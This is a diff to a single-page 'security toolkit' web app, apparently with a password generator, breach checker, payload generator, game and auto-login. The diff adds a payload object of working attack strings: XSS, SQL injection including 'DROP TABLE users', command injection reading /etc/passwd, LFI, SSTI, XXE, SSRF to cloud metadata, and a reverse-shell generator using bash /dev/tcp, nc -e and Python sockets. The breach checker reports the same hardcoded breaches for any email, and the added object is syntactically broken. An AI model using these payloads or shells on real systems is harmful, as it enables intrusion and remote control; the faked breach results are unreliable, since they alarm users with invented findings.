@@ -240,7 +240,7 @@ body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;backg
 <label style="display:flex;align-items:center;gap:7px;font-size:11px;color:var(--g);cursor:pointer"><input type="checkbox" id="plo" checked style="accent-color:var(--g)"> LOWERCASE a-z</label>
 <label style="display:flex;align-items:center;gap:7px;font-size:11px;color:var(--g);cursor:pointer"><input type="checkbox" id="pn" checked style="accent-color:var(--g)"> NUMBERS 0-9</label>
 <label style="display:flex;align-items:center;gap:7px;font-size:11px;color:var(--g);cursor:pointer"><input type="checkbox" id="psym" checked style="accent-color:var(--g)"> SYMBOLS</label>
-</div>
+</div></div>
 <div class="fi"><label>QUANTITY</label><input type="number" id="pqty" value="5" min="1" max="20"></div>
 <div class="fi"><label>MODE</label><select id="pmode"><option value="random">RANDOM</option><option value="passphrase">PASSPHRASE</option><option value="pin">PIN</option></select></div>
 <button class="btn btnw" onclick="genPwd()">&#9889; GENERATE</button>
@@ -1047,11 +1047,19 @@ function checkBreach(){
 function showBreachRes(email){
   const found=[{src:'LinkedIn 2021',type:'Email+Password',date:'2021-06-22'},{src:'Adobe 2013',type:'Email+Hash',date:'2013-10-04'},{src:'Dropbox 2012',type:'Email+Hash',date:'2012-07-01'}];
   document.getElementById('bres').innerHTML=`<div style="font-size:11px;margin-bottom:8px;color:var(--r)">⚠ ${found.length} breaches found for ${email}</div>`+found.map(b=>`<div class="bri brf"><strong>${b.src}</strong> — ${b.type}<br>${b.date} ⚠ Change password!</div>`).join('')+`<div style="margin-top:8px;font-size:10px;color:var(--y)">⚠ Change passwords immediately!</div>`;
-xss:['&lt;script&gt;alert(1)&lt;/script&gt;', '&lt;img src=x onerror=alert(1)&gt;', '&lt;svg onload=alert(1)&gt;'],
+}
+
+// PAYLOAD GENERATOR
+const PDATA={
+xss: [
+    '&lt;script&gt;alert(1)&lt;/script&gt;', 
+    '&lt;img src=x onerror=alert(1)&gt;', 
+    '&lt;svg onload=alert(1)&gt;',
+]
   sqli:["' OR '1'='1","' OR 1=1--","admin'--","' UNION SELECT null,null,null--","' AND SLEEP(5)--","1; DROP TABLE users--"],
   rce:[';id','|id','&&id','`id`','$(id)','; cat /etc/passwd','| whoami'],
   lfi:['../../../etc/passwd','..%2F..%2Fetc%2Fpasswd','....//....//etc/passwd','php://filter/convert.base64-encode/resource=index.php'],
-  ssti:['{{7*7}}','${7*7}','<%= 7*7 %>','{{config}}','#{7*7}'],
+  ssti:['{7*7}','${7*7}','<%= 7*7 %>','{config}','#{7*7}'],
   xxe:['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
   ssrf:['http://169.254.169.254/latest/meta-data/','http://localhost:22','http://127.0.0.1/admin'],
   rev:(h,p)=>`bash -i >& /dev/tcp/${h}/${p} 0>&1\n\nnc -e /bin/bash ${h} ${p}\n\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${h}",${p}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/bash","-i"])'`,
@@ -1403,52 +1411,27 @@ function checkWin(){if(gRev>=gRows*gCols-gMines){gOver=true;clearInterval(gTIV);
 
 // AUTO LOGIN ON LOAD — FIXED FOR MOBILE
 window.addEventListener('load',()=>{
-
   initGame('medium');
-
-  if(CU && CU.length>0){
-
-    const L =
-    document.getElementById('login');
-
-    const A =
-    document.getElementById('app');
-
-    if(L) L.style.display='none';
-
-    if(A) A.style.display='block';
-
-    const ub =
-    document.getElementById('ub');
-
-    if(ub) ub.textContent=CU;
-
-    if(typeof updST==='function')
-      updST();
-
+  if(CU&&CU.length>0){
+    const L=document.getElementById('login');
+    const A=document.getElementById('app');
+    L.style.display='none';
+    L.style.visibility='hidden';
+    L.style.opacity='0';
+    L.style.pointerEvents='none';
+    A.style.display='block';
+    A.style.visibility='visible';
+    A.style.opacity='1';
+    document.getElementById('ub').textContent=CU;
+    updST();
     setTimeout(()=>{
-
-      if(typeof startDash==='function')
-        startDash();
-
-      if(typeof buildThreats==='function')
-        buildThreats();
-
-      if(typeof buildExploits==='function')
-        buildExploits();
-
-      if(typeof buildOwasp==='function')
-        buildOwasp();
-
-      if(typeof buildBreaches==='function')
-        buildBreaches();
-
-      if(typeof buildCTF==='function')
-        buildCTF();
-
-      if(typeof updatePayload==='function')
-        updatePayload();
-
+      startDash();
+      buildThreats();
+      buildExploits();
+      buildOwasp();
+      buildBreaches();
+      buildCTF();
+      updatePayload();
     },300);
   }
 });
